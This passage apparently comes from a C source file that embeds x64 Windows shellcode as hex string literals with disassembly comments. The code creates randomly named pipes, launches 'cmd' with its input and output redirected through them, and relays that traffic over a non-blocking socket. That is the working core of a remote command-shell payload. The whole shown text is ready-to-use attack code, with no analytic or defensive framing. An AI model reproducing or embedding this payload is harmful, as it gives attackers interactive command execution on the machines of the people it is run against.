  /* 0AE0 */ "\x48\x8b\x8e\x00\x09\x00\x00"             /* mov rcx, [rsi+0x900]               */
  /* 0AE7 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 0AEA */ "\xff\x96\xa8\x00\x00\x00"                 /* call qword [rsi+0xa8]              */
  /* 0AF0 */ "\x48\x8b\x8e\x00\x09\x00\x00"             /* mov rcx, [rsi+0x900]               */
  /* 0AF7 */ "\x83\x64\x24\x60\x00"                     /* and dword [rsp+0x60], 0x0          */
  /* 0AFC */ "\x4c\x8d\x44\x24\x60"                     /* lea r8, [rsp+0x60]                 */
  /* 0B01 */ "\xba\x7e\x66\x04\x80"                     /* mov edx, 0x8004667e                */
  /* 0B06 */ "\xff\x96\xa0\x00\x00\x00"                 /* call qword [rsi+0xa0]              */
  /* 0B0C */ "\xf6\x44\x24\x20\x20"                     /* test byte [rsp+0x20], 0x20         */
  /* 0B11 */ "\x48\x8b\x5c\x24\x68"                     /* mov rbx, [rsp+0x68]                */
  /* 0B16 */ "\x48\x8b\x74\x24\x78"                     /* mov rsi, [rsp+0x78]                */
  /* 0B1B */ "\x0f\x45\xfd"                             /* cmovnz edi, ebp                    */
  /* 0B1E */ "\x48\x8b\x6c\x24\x70"                     /* mov rbp, [rsp+0x70]                */
  /* 0B23 */ "\x8b\xc7"                                 /* mov eax, edi                       */
  /* 0B25 */ "\x48\x83\xc4\x50"                         /* add rsp, 0x50                      */
  /* 0B29 */ "\x5f"                                     /* pop rdi                            */
  /* 0B2A */ "\xc3"                                     /* ret                                */
  /* 0B2B */ "\xcc"                                     /* int3                               */
  /* 0B2C */ "\x4c\x8b\xdc"                             /* mov r11, rsp                       */
  /* 0B2F */ "\x49\x89\x5b\x08"                         /* mov [r11+0x8], rbx                 */
  /* 0B33 */ "\x49\x89\x73\x10"                         /* mov [r11+0x10], rsi                */
  /* 0B37 */ "\x57"                                     /* push rdi                           */
  /* 0B38 */ "\x48\x83\xec\x50"                         /* sub rsp, 0x50                      */
  /* 0B3C */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 0B3F */ "\x33\xf6"                                 /* xor esi, esi                       */
  /* 0B41 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 0B43 */ "\x8d\x4e\x20"                             /* lea ecx, [rsi+0x20]                */
  /* 0B46 */ "\x49\x8d\x7b\xd8"                         /* lea rdi, [r11-0x28]                */
  /* 0B4A */ "\xc7\x83\x50\x09\x00\x00\x03\x00\x00\x00" /* mov dword [rbx+0x950], 0x3         */
  /* 0B54 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 0B56 */ "\x48\x8b\x83\x30\x09\x00\x00"             /* mov rax, [rbx+0x930]               */
  /* 0B5D */ "\x49\x89\x43\xf0"                         /* mov [r11-0x10], rax                */
  /* 0B61 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0B64 */ "\xe8\x0b\xff\xff\xff"                     /* call 0xa74                         */
  /* 0B69 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0B6B */ "\x75\x34"                                 /* jnz 0xba1                          */
  /* 0B6D */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0B70 */ "\xe8\x5b\xfc\xff\xff"                     /* call 0x7d0                         */
  /* 0B75 */ "\x4c\x8d\x8b\xe0\x00\x00\x00"             /* lea r9, [rbx+0xe0]                 */
  /* 0B7C */ "\x45\x8b\x01"                             /* mov r8d, [r9]                      */
  /* 0B7F */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 0B82 */ "\x0f\x84\x83\x00\x00\x00"                 /* jz 0xc0b                           */
  /* 0B88 */ "\x48\x8b\x8b\x10\x09\x00\x00"             /* mov rcx, [rbx+0x910]               */
  /* 0B8F */ "\x48\x83\x64\x24\x20\x00"                 /* and qword [rsp+0x20], 0x0          */
  /* 0B95 */ "\x48\x8d\x93\xf0\x00\x00\x00"             /* lea rdx, [rbx+0xf0]                */
  /* 0B9C */ "\xff\x53\x18"                             /* call qword [rbx+0x18]              */
  /* 0B9F */ "\xeb\xc0"                                 /* jmp 0xb61                          */
  /* 0BA1 */ "\x83\xf8\x01"                             /* cmp eax, 0x1                       */
  /* 0BA4 */ "\x75\x65"                                 /* jnz 0xc0b                          */
  /* 0BA6 */ "\x48\x8b\x8b\x08\x09\x00\x00"             /* mov rcx, [rbx+0x908]               */
  /* 0BAD */ "\x48\x8d\xbb\xe0\x00\x00\x00"             /* lea rdi, [rbx+0xe0]                */
  /* 0BB4 */ "\x85\xf6"                                 /* test esi, esi                      */
  /* 0BB6 */ "\x75\x24"                                 /* jnz 0xbdc                          */
  /* 0BB8 */ "\x48\x8d\x44\x24\x30"                     /* lea rax, [rsp+0x30]                */
  /* 0BBD */ "\x48\x8d\x93\xf0\x00\x00\x00"             /* lea rdx, [rbx+0xf0]                */
  /* 0BC4 */ "\x4c\x8b\xcf"                             /* mov r9, rdi                        */
  /* 0BC7 */ "\x41\xb8\x00\x02\x00\x00"                 /* mov r8d, 0x200                     */
  /* 0BCD */ "\x48\x89\x44\x24\x20"                     /* mov [rsp+0x20], rax                */
  /* 0BD2 */ "\xff\x53\x20"                             /* call qword [rbx+0x20]              */
  /* 0BD5 */ "\xbe\x01\x00\x00\x00"                     /* mov esi, 0x1                       */
  /* 0BDA */ "\xeb\x12"                                 /* jmp 0xbee                          */
  /* 0BDC */ "\x48\x8d\x54\x24\x30"                     /* lea rdx, [rsp+0x30]                */
  /* 0BE1 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0BE4 */ "\x4c\x8b\xc7"                             /* mov r8, rdi                        */
  /* 0BE7 */ "\xff\x53\x28"                             /* call qword [rbx+0x28]              */
  /* 0BEA */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0BEC */ "\x74\x1d"                                 /* jz 0xc0b                           */
  /* 0BEE */ "\x83\x3f\x00"                             /* cmp dword [rdi], 0x0               */
  /* 0BF1 */ "\x0f\x84\x6a\xff\xff\xff"                 /* jz 0xb61                           */
  /* 0BF7 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0BFA */ "\xe8\xb9\xfa\xff\xff"                     /* call 0x6b8                         */
  /* 0BFF */ "\x83\x3f\x00"                             /* cmp dword [rdi], 0x0               */
  /* 0C02 */ "\x76\x07"                                 /* jbe 0xc0b                          */
  /* 0C04 */ "\xff\xce"                                 /* dec esi                            */
  /* 0C06 */ "\xe9\x56\xff\xff\xff"                     /* jmp 0xb61                          */
  /* 0C0B */ "\x48\x8b\x74\x24\x68"                     /* mov rsi, [rsp+0x68]                */
  /* 0C10 */ "\xc7\x83\x50\x09\x00\x00\x01\x00\x00\x00" /* mov dword [rbx+0x950], 0x1         */
  /* 0C1A */ "\x48\x8b\x5c\x24\x60"                     /* mov rbx, [rsp+0x60]                */
  /* 0C1F */ "\x48\x83\xc4\x50"                         /* add rsp, 0x50                      */
  /* 0C23 */ "\x5f"                                     /* pop rdi                            */
  /* 0C24 */ "\xc3"                                     /* ret                                */
  /* 0C25 */ "\xcc"                                     /* int3                               */
  /* 0C26 */ "\xcc"                                     /* int3                               */
  /* 0C27 */ "\xcc"                                     /* int3                               */
  /* 0C28 */ "\x48\x89\x5c\x24\x10"                     /* mov [rsp+0x10], rbx                */
  /* 0C2D */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 0C32 */ "\x55"                                     /* push rbp                           */
  /* 0C33 */ "\x57"                                     /* push rdi                           */
  /* 0C34 */ "\x41\x54"                                 /* push r12                           */
  /* 0C36 */ "\x48\x8d\x6c\x24\xf0"                     /* lea rbp, [rsp-0x10]                */
  /* 0C3B */ "\x48\x81\xec\x10\x01\x00\x00"             /* sub rsp, 0x110                     */
  /* 0C42 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 0C45 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 0C47 */ "\x48\x8d\x7c\x24\x78"                     /* lea rdi, [rsp+0x78]                */
  /* 0C4C */ "\x8d\x48\x20"                             /* lea ecx, [rax+0x20]                */
  /* 0C4F */ "\x48\x8d\x74\x24\x50"                     /* lea rsi, [rsp+0x50]                */
  /* 0C54 */ "\xc7\x44\x24\x50\x5c\x5c\x2e\x5c"         /* mov dword [rsp+0x50], 0x5c2e5c5c   */
  /* 0C5C */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 0C5E */ "\x8d\x48\x09"                             /* lea ecx, [rax+0x9]                 */
  /* 0C61 */ "\x48\x8d\x7c\x24\x78"                     /* lea rdi, [rsp+0x78]                */
  /* 0C66 */ "\xc7\x44\x24\x54\x70\x69\x70\x65"         /* mov dword [rsp+0x54], 0x65706970   */
  /* 0C6E */ "\xc6\x44\x24\x58\x5c"                     /* mov byte [rsp+0x58], 0x5c          */
  /* 0C73 */ "\xc7\x45\x30\x63\x6d\x64\x00"             /* mov dword [rbp+0x30], 0x646d63     */
  /* 0C7A */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 0C7C */ "\xff\x53\x48"                             /* call qword [rbx+0x48]              */
  /* 0C7F */ "\x48\x8d\x75\x81"                         /* lea rsi, [rbp-0x7f]                */
  /* 0C83 */ "\x8b\xf8"                                 /* mov edi, eax                       */
  /* 0C85 */ "\x41\xb8\x08\x00\x00\x00"                 /* mov r8d, 0x8                       */
  /* 0C8B */ "\xb8\x4f\xec\xc4\x4e"                     /* mov eax, 0x4ec4ec4f                */
  /* 0C90 */ "\xf7\xe7"                                 /* mul edi                            */
  /* 0C92 */ "\xb0\x1a"                                 /* mov al, 0x1a                       */
  /* 0C94 */ "\xc1\xea\x03"                             /* shr edx, 0x3                       */
  /* 0C97 */ "\xf6\xea"                                 /* imul dl                            */
  /* 0C99 */ "\x40\x8a\xd7"                             /* mov dl, dil                        */
  /* 0C9C */ "\xc1\xef\x02"                             /* shr edi, 0x2                       */
  /* 0C9F */ "\x2a\xd0"                                 /* sub dl, al                         */
  /* 0CA1 */ "\x80\xc2\x61"                             /* add dl, 0x61                       */
  /* 0CA4 */ "\x88\x16"                                 /* mov [rsi], dl                      */
  /* 0CA6 */ "\x48\xff\xc6"                             /* inc rsi                            */
  /* 0CA9 */ "\x49\xff\xc8"                             /* dec r8                             */
  /* 0CAC */ "\x75\xdd"                                 /* jnz 0xc8b                          */
  /* 0CAE */ "\x4c\x21\x44\x24\x68"                     /* and [rsp+0x68], r8                 */
  /* 0CB3 */ "\x48\x8d\x44\x24\x60"                     /* lea rax, [rsp+0x60]                */
  /* 0CB8 */ "\x45\x8d\x48\x01"                         /* lea r9d, [r8+0x1]                  */
  /* 0CBC */ "\x48\x89\x44\x24\x38"                     /* mov [rsp+0x38], rax                */
  /* 0CC1 */ "\x44\x21\x44\x24\x30"                     /* and [rsp+0x30], r8d                */
  /* 0CC6 */ "\x44\x21\x44\x24\x28"                     /* and [rsp+0x28], r8d                */
  /* 0CCB */ "\x44\x21\x44\x24\x20"                     /* and [rsp+0x20], r8d                */
  /* 0CD0 */ "\x48\x8d\x4c\x24\x78"                     /* lea rcx, [rsp+0x78]                */
  /* 0CD5 */ "\xba\x01\x00\x00\x40"                     /* mov edx, 0x40000001                */
  /* 0CDA */ "\xc7\x44\x24\x60\x18\x00\x00\x00"         /* mov dword [rsp+0x60], 0x18         */
  /* 0CE2 */ "\xc7\x44\x24\x70\x01\x00\x00\x00"         /* mov dword [rsp+0x70], 0x1          */
  /* 0CEA */ "\xff\x13"                                 /* call qword [rbx]                   */
  /* 0CEC */ "\x48\x89\x83\x08\x09\x00\x00"             /* mov [rbx+0x908], rax               */
  /* 0CF3 */ "\x48\x83\xf8\xff"                         /* cmp rax, 0xffffffffffffffff        */
  /* 0CF7 */ "\x0f\x84\x37\x01\x00\x00"                 /* jz 0xe34                           */
  /* 0CFD */ "\x4c\x8d\x44\x24\x60"                     /* lea r8, [rsp+0x60]                 */
  /* 0D02 */ "\x48\x8d\x93\x10\x09\x00\x00"             /* lea rdx, [rbx+0x910]               */
  /* 0D09 */ "\x48\x8d\x8b\x18\x09\x00\x00"             /* lea rcx, [rbx+0x918]               */
  /* 0D10 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0D13 */ "\xff\x53\x08"                             /* call qword [rbx+0x8]               */
  /* 0D16 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0D18 */ "\x0f\x84\x0c\x01\x00\x00"                 /* jz 0xe2a                           */
  /* 0D1E */ "\x48\x83\x64\x24\x30\x00"                 /* and qword [rsp+0x30], 0x0          */
  /* 0D24 */ "\x83\x64\x24\x28\x00"                     /* and dword [rsp+0x28], 0x0          */
  /* 0D29 */ "\x4c\x8d\x4c\x24\x60"                     /* lea r9, [rsp+0x60]                 */
  /* 0D2E */ "\x48\x8d\x4c\x24\x78"                     /* lea rcx, [rsp+0x78]                */
  /* 0D33 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 0D36 */ "\xba\x00\x00\x00\x40"                     /* mov edx, 0x40000000                */
  /* 0D3B */ "\xc7\x44\x24\x20\x03\x00\x00\x00"         /* mov dword [rsp+0x20], 0x3          */
  /* 0D43 */ "\xff\x53\x10"                             /* call qword [rbx+0x10]              */
  /* 0D46 */ "\x48\x89\x83\x20\x09\x00\x00"             /* mov [rbx+0x920], rax               */
  /* 0D4D */ "\x48\x83\xf8\xff"                         /* cmp rax, 0xffffffffffffffff        */
  /* 0D51 */ "\x0f\x84\xbf\x00\x00\x00"                 /* jz 0xe16                           */
  /* 0D57 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0D5A */ "\x33\xc9"                                 /* xor ecx, ecx                       */
  /* 0D5C */ "\x41\x8d\x51\x01"                         /* lea edx, [r9+0x1]                  */
  /* 0D60 */ "\x44\x8b\xc2"                             /* mov r8d, edx                       */
  /* 0D63 */ "\xff\x53\x40"                             /* call qword [rbx+0x40]              */
  /* 0D66 */ "\x48\x8d\x7d\xa0"                         /* lea rdi, [rbp-0x60]                */
  /* 0D6A */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0D6D */ "\x48\x89\x83\x30\x09\x00\x00"             /* mov [rbx+0x930], rax               */
  /* 0D74 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 0D76 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 0D79 */ "\x8d\x50\x68"                             /* lea edx, [rax+0x68]                */
  /* 0D7C */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 0D7E */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 0D80 */ "\x48\x8b\x83\x18\x09\x00\x00"             /* mov rax, [rbx+0x918]               */
  /* 0D87 */ "\x89\x55\xa0"                             /* mov [rbp-0x60], edx                */
  /* 0D8A */ "\x48\x89\x45\xf0"                         /* mov [rbp-0x10], rax                */
  /* 0D8E */ "\x48\x8b\x83\x20\x09\x00\x00"             /* mov rax, [rbx+0x920]               */
  /* 0D95 */ "\x48\x8d\xbb\x38\x09\x00\x00"             /* lea rdi, [rbx+0x938]               */
  /* 0D9C */ "\x48\x89\x7c\x24\x48"                     /* mov [rsp+0x48], rdi                */
  /* 0DA1 */ "\x48\x89\x45\x00"                         /* mov [rbp], rax                     */
  /* 0DA5 */ "\x48\x89\x45\xf8"                         /* mov [rbp-0x8], rax                 */
  /* 0DA9 */ "\x48\x8d\x45\xa0"                         /* lea rax, [rbp-0x60]                */
  /* 0DAD */ "\x48\x8d\x55\x30"                         /* lea rdx, [rbp+0x30]                */
  /* 0DB1 */ "\x33\xc9"                                 /* xor ecx, ecx                       */
  /* 0DB3 */ "\x48\x89\x44\x24\x40"                     /* mov [rsp+0x40], rax                */
  /* 0DB8 */ "\x48\x83\x64\x24\x38\x00"                 /* and qword [rsp+0x38], 0x0          */
  /* 0DBE */ "\x48\x83\x64\x24\x30\x00"                 /* and qword [rsp+0x30], 0x0          */
  /* 0DC4 */ "\xc7\x44\x24\x28\x00\x00\x00\x08"         /* mov dword [rsp+0x28], 0x8000000    */
  /* 0DCC */ "\xc7\x45\xdc\x00\x01\x00\x00"             /* mov dword [rbp-0x24], 0x100        */
  /* 0DD3 */ "\xc7\x44\x24\x20\x01\x00\x00\x00"         /* mov dword [rsp+0x20], 0x1          */
  /* 0DDB */ "\xff\x53\x30"                             /* call qword [rbx+0x30]              */
  /* 0DDE */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0DE0 */ "\x74\x20"                                 /* jz 0xe02                           */
  /* 0DE2 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0DE5 */ "\xe8\x42\xfd\xff\xff"                     /* call 0xb2c                         */
  /* 0DEA */ "\x48\x8b\x0f"                             /* mov rcx, [rdi]                     */
  /* 0DED */ "\x33\xd2"                                 /* xor edx, edx                       */
  /* 0DEF */ "\xff\x53\x38"                             /* call qword [rbx+0x38]              */
  /* 0DF2 */ "\x48\x8b\x8b\x40\x09\x00\x00"             /* mov rcx, [rbx+0x940]               */
  /* 0DF9 */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0DFC */ "\x48\x8b\x0f"                             /* mov rcx, [rdi]                     */
  /* 0DFF */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E02 */ "\x48\x8b\x8b\x30\x09\x00\x00"             /* mov rcx, [rbx+0x930]               */
  /* 0E09 */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E0C */ "\x48\x8b\x8b\x20\x09\x00\x00"             /* mov rcx, [rbx+0x920]               */
  /* 0E13 */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E16 */ "\x48\x8b\x8b\x10\x09\x00\x00"             /* mov rcx, [rbx+0x910]               */
  /* 0E1D */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E20 */ "\x48\x8b\x8b\x18\x09\x00\x00"             /* mov rcx, [rbx+0x918]               */
  /* 0E27 */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E2A */ "\x48\x8b\x8b\x08\x09\x00\x00"             /* mov rcx, [rbx+0x908]               */
  /* 0E31 */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0E34 */ "\x83\xa3\xe0\x00\x00\x00\x00"             /* and dword [rbx+0xe0], 0x0          */
  /* 0E3B */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0E3E */ "\xe8\x75\xf8\xff\xff"                     /* call 0x6b8                         */
  /* 0E43 */ "\x4c\x8d\x9c\x24\x10\x01\x00\x00"         /* lea r11, [rsp+0x110]               */
  /* 0E4B */ "\x49\x8b\x5b\x28"                         /* mov rbx, [r11+0x28]                */
  /* 0E4F */ "\x49\x8b\x73\x30"                         /* mov rsi, [r11+0x30]                */
  /* 0E53 */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 0E56 */ "\x41\x5c"                                 /* pop r12                            */
  /* 0E58 */ "\x5f"                                     /* pop rdi                            */
  /* 0E59 */ "\x5d"                                     /* pop rbp                            */
  /* 0E5A */ "\xc3"                                     /* ret                                */
  /* 0E5B */ "\xcc"                                     /* int3                               */
  /* 0E5C */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 0E5F */ "\x48\x89\x58\x08"                         /* mov [rax+0x8], rbx                 */
  /* 0E63 */ "\x48\x89\x68\x10"                         /* mov [rax+0x10], rbp                */
  /* 0E67 */ "\x48\x89\x70\x18"                         /* mov [rax+0x18], rsi                */
  /* 0E6B */ "\x48\x89\x78\x20"                         /* mov [rax+0x20], rdi                */
  /* 0E6F */ "\x41\x54"                                 /* push r12                           */
  /* 0E71 */ "\x48\x83\xec\x40"                         /* sub rsp, 0x40                      */
  /* 0E75 */ "\x48\x83\x60\xe8\x00"                     /* and qword [rax-0x18], 0x0          */
  /* 0E7A */ "\x83\x60\xe0\x00"                         /* and dword [rax-0x20], 0x0          */
  /* 0E7E */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0E81 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 0E84 */ "\x45\x8d\x41\x01"                         /* lea r8d, [r9+0x1]                  */
  /* 0E88 */ "\xba\x00\x00\x00\x80"                     /* mov edx, 0x80000000                */
  /* 0E8D */ "\x48\x81\xc1\xf4\x00\x00\x00"             /* add rcx, 0xf4                      */
  /* 0E94 */ "\xc7\x40\xd8\x03\x00\x00\x00"             /* mov dword [rax-0x28], 0x3          */
  /* 0E9B */ "\xff\x53\x10"                             /* call qword [rbx+0x10]              */
  /* 0E9E */ "\x48\x8b\xf8"                             /* mov rdi, rax                       */
  /* 0EA1 */ "\xff\x53\x50"                             /* call qword [rbx+0x50]              */
  /* 0EA4 */ "\xc7\x83\xe0\x00\x00\x00\x04\x00\x00\x00" /* mov dword [rbx+0xe0], 0x4          */
  /* 0EAE */ "\x89\x83\xf0\x00\x00\x00"                 /* mov [rbx+0xf0], eax                */
  /* 0EB4 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0EB6 */ "\x75\x17"                                 /* jnz 0xecf                          */
  /* 0EB8 */ "\x48\x8d\x93\xf4\x00\x00\x00"             /* lea rdx, [rbx+0xf4]                */
  /* 0EBF */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0EC2 */ "\xc7\x83\xe0\x00\x00\x00\x0c\x00\x00\x00" /* mov dword [rbx+0xe0], 0xc          */
  /* 0ECC */ "\xff\x53\x70"                             /* call qword [rbx+0x70]              */
  /* 0ECF */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0ED2 */ "\xe8\xe1\xf7\xff\xff"                     /* call 0x6b8                         */
  /* 0ED7 */ "\x48\x83\xff\xff"                         /* cmp rdi, 0xffffffffffffffff        */
  /* 0EDB */ "\x74\x44"                                 /* jz 0xf21                           */
  /* 0EDD */ "\xeb\x04"                                 /* jmp 0xee3                          */
  /* 0EDF */ "\x85\xed"                                 /* test ebp, ebp                      */
  /* 0EE1 */ "\x75\x38"                                 /* jnz 0xf1b                          */
  /* 0EE3 */ "\x48\x83\x64\x24\x20\x00"                 /* and qword [rsp+0x20], 0x0          */
  /* 0EE9 */ "\x4c\x8d\x8b\xe0\x00\x00\x00"             /* lea r9, [rbx+0xe0]                 */
  /* 0EF0 */ "\x48\x8d\x93\xf0\x00\x00\x00"             /* lea rdx, [rbx+0xf0]                */
  /* 0EF7 */ "\x41\xb8\x00\x08\x00\x00"                 /* mov r8d, 0x800                     */
  /* 0EFD */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0F00 */ "\xff\x53\x20"                             /* call qword [rbx+0x20]              */
  /* 0F03 */ "\x33\xed"                                 /* xor ebp, ebp                       */
  /* 0F05 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0F08 */ "\x39\xab\xe0\x00\x00\x00"                 /* cmp [rbx+0xe0], ebp                */
  /* 0F0E */ "\x40\x0f\x94\xc5"                         /* setz bpl                           */
  /* 0F12 */ "\xe8\xa1\xf7\xff\xff"                     /* call 0x6b8                         */
  /* 0F17 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0F19 */ "\x74\xc4"                                 /* jz 0xedf                           */
  /* 0F1B */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0F1E */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0F21 */ "\x48\x8b\x5c\x24\x50"                     /* mov rbx, [rsp+0x50]                */
  /* 0F26 */ "\x48\x8b\x6c\x24\x58"                     /* mov rbp, [rsp+0x58]                */
  /* 0F2B */ "\x48\x8b\x74\x24\x60"                     /* mov rsi, [rsp+0x60]                */
  /* 0F30 */ "\x48\x8b\x7c\x24\x68"                     /* mov rdi, [rsp+0x68]                */
  /* 0F35 */ "\x48\x83\xc4\x40"                         /* add rsp, 0x40                      */
  /* 0F39 */ "\x41\x5c"                                 /* pop r12                            */
  /* 0F3B */ "\xc3"                                     /* ret                                */
  /* 0F3C */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 0F3F */ "\x48\x89\x58\x10"                         /* mov [rax+0x10], rbx                */
  /* 0F43 */ "\x48\x89\x70\x18"                         /* mov [rax+0x18], rsi                */
  /* 0F47 */ "\x57"                                     /* push rdi                           */
  /* 0F48 */ "\x48\x83\xec\x40"                         /* sub rsp, 0x40                      */
  /* 0F4C */ "\x48\x83\x60\xe8\x00"                     /* and qword [rax-0x18], 0x0          */
  /* 0F51 */ "\x83\x60\xe0\x00"                         /* and dword [rax-0x20], 0x0          */
  /* 0F55 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 0F58 */ "\x48\x81\xc1\xf4\x00\x00\x00"             /* add rcx, 0xf4                      */
  /* 0F5F */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0F62 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 0F65 */ "\xba\x00\x00\x00\x40"                     /* mov edx, 0x40000000                */
  /* 0F6A */ "\xc7\x40\xd8\x01\x00\x00\x00"             /* mov dword [rax-0x28], 0x1          */
  /* 0F71 */ "\xff\x53\x10"                             /* call qword [rbx+0x10]              */
  /* 0F74 */ "\x48\x8b\xf8"                             /* mov rdi, rax                       */
  /* 0F77 */ "\xff\x53\x50"                             /* call qword [rbx+0x50]              */
  /* 0F7A */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0F7D */ "\x89\x83\xf0\x00\x00\x00"                 /* mov [rbx+0xf0], eax                */
  /* 0F83 */ "\xc7\x83\xe0\x00\x00\x00\x04\x00\x00\x00" /* mov dword [rbx+0xe0], 0x4          */
  /* 0F8D */ "\xe8\x26\xf7\xff\xff"                     /* call 0x6b8                         */
  /* 0F92 */ "\x48\x83\xff\xff"                         /* cmp rdi, 0xffffffffffffffff        */
  /* 0F96 */ "\x74\x38"                                 /* jz 0xfd0                           */
  /* 0F98 */ "\xeb\x24"                                 /* jmp 0xfbe                          */
  /* 0F9A */ "\x44\x8b\x83\xe0\x00\x00\x00"             /* mov r8d, [rbx+0xe0]                */
  /* 0FA1 */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 0FA4 */ "\x74\x24"                                 /* jz 0xfca                           */
  /* 0FA6 */ "\x48\x83\x64\x24\x20\x00"                 /* and qword [rsp+0x20], 0x0          */
  /* 0FAC */ "\x4c\x8d\x4c\x24\x50"                     /* lea r9, [rsp+0x50]                 */
  /* 0FB1 */ "\x48\x8d\x93\xf0\x00\x00\x00"             /* lea rdx, [rbx+0xf0]                */
  /* 0FB8 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0FBB */ "\xff\x53\x18"                             /* call qword [rbx+0x18]              */
  /* 0FBE */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0FC1 */ "\xe8\x0a\xf8\xff\xff"                     /* call 0x7d0                         */
  /* 0FC6 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0FC8 */ "\x74\xd0"                                 /* jz 0xf9a                           */
  /* 0FCA */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0FCD */ "\xff\x53\x58"                             /* call qword [rbx+0x58]              */
  /* 0FD0 */ "\x48\x8b\x5c\x24\x58"                     /* mov rbx, [rsp+0x58]                */
  /* 0FD5 */ "\x48\x8b\x74\x24\x60"                     /* mov rsi, [rsp+0x60]                */
  /* 0FDA */ "\x48\x83\xc4\x40"                         /* add rsp, 0x40                      */
  /* 0FDE */ "\x5f"                                     /* pop rdi                            */
  /* 0FDF */ "\xc3"                                     /* ret                                */
  /* 0FE0 */ "\x40\x53"                                 /* push rbx                           */
  /* 0FE2 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 0FE6 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 0FE9 */ "\xff\x91\xb8\x00\x00\x00"                 /* call qword [rcx+0xb8]              */
  /* 0FEF */ "\xff\x83\x50\x09\x00\x00"                 /* inc dword [rbx+0x950]              */
  /* 0FF5 */ "\x48\x89\x83\x28\x09\x00\x00"             /* mov [rbx+0x928], rax               */
  /* 0FFC */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 0FFF */ "\xe8\x70\xfa\xff\xff"                     /* call 0xa74                         */
  /* 1004 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 1006 */ "\x75\x22"                                 /* jnz 0x102a                         */
  /* 1008 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 100B */ "\xe8\xc0\xf7\xff\xff"                     /* call 0x7d0                         */
  /* 1010 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 1012 */ "\x75\x16"                                 /* jnz 0x102a                         */
  /* 1014 */ "\x8b\x8b\xf0\x00\x00\x00"                 /* mov ecx, [rbx+0xf0]                */
  /* 101A */ "\xff\xc9"                                 /* dec ecx                            */
  /* 101C */ "\x74\x33"                                 /* jz 0x1051                          */
  /* 101E */ "\xff\xc9"                                 /* dec ecx                            */
  /* 1020 */ "\x74\x25"                                 /* jz 0x1047                          */
  /* 1022 */ "\xff\xc9"                                 /* dec ecx                            */
  /* 1024 */ "\x74\x17"                                 /* jz 0x103d                          */
  /* 1026 */ "\xff\xc9"                                 /* dec ecx                            */
  /* 1028 */ "\x75\xd2"                                 /* jnz 0xffc                          */
  /* 102A */ "\x48\x8b\x8b\x28\x09\x00\x00"             /* mov rcx, [rbx+0x928]               */
  /* 1031 */ "\x48\x8b\x43\x58"                         /* mov rax, [rbx+0x58]                */
  /* 1035 */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 1039 */ "\x5b"                                     /* pop rbx                            */
  /* 103A */ "\x48\xff\xe0"                             /* jmp rax                            */
